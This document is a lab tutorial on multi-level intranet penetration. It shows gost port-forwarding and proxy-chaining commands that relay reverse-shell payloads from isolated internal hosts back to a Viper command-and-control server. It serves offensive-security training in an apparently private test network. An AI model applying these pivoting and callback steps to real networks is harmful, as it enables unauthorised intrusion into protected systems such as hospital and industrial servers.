# Multi-level Intranet Penetration (gost & viper)

## What is a multi-level intranet?
The multi-level intranet mentioned in the title is common in various large enterprises. For example, as shown in the following figure:

![](img\multi_level_intranet_penetration_gost_viper\1.webp)

In network A, it is generally the DMZ area of the enterprise, which contains external web servers, DNS servers, etc.

In network B, it is generally the server area of the enterprise intranet, including domain control servers, internal network OA, etc.

In network C, it is generally the red area of the enterprise, which contains databases storing sensitive information or various key business servers. (For example, the HIS of a hospital, the industrial controller of an industrial enterprise, etc.)

In this kind of network, network A can connect to the Internet, network B can connect to network A and network C but cannot connect to the Internet, and network C can only connect to network B.

## Penetrating multi-level intranets by combining Viper and gost
The network configuration of the experimental environment is as follows:

![](img\multi_level_intranet_penetration_gost_viper\2.webp)

+ Connect to 192.168.146.1

![](img\multi_level_intranet_penetration_gost_viper\3.webp)

+ Use gost on 192.168.146.1 to start a port forwarding and forward the traffic of 192.168.146.1:2000 to 192.168.146.130:2000

```plain
gost.exe -L=tcp://:2000/192.168.146.130:2000
```

![](img\multi_level_intranet_penetration_gost_viper\4.webp)

+ On 146.11, execute the payload to connect back to 146.1:2000, and 146.11 is online (it can be seen that it is connected back through 146.1)

![](img\multi_level_intranet_penetration_gost_viper\5.webp)

+ Connect to 146.12 is more complicated. First, use gost on 146.1:8080 to start a proxy:

```plain
gost.exe -L :8080
```

![](img\multi_level_intranet_penetration_gost_viper\6.webp)

+ Then start port forwarding on 146.11. The traffic passes through the proxy of 146.1:8080:

```plain
gost.exe -L=tcp://:2000/192.168.146.130:2000 -F 192.168.146.1:8080
```

![](img\multi_level_intranet_penetration_gost_viper\7.webp)

+ On 146.12, execute the payload to connect back to 146.11:2000, and 146.12 is online (it can be seen that 146.12 is connected back through 146.1)

![](img\multi_level_intranet_penetration_gost_viper\8.webp)

+ After the payload of 146.12 connects to the 2000 port of 146.11, the gost of 146.11 will add the proxy header to the traffic and then send it to the proxy of 146.1:8080. The proxy of 146.1:8080 parses the proxy header and finally sends the traffic to 146.130:2000.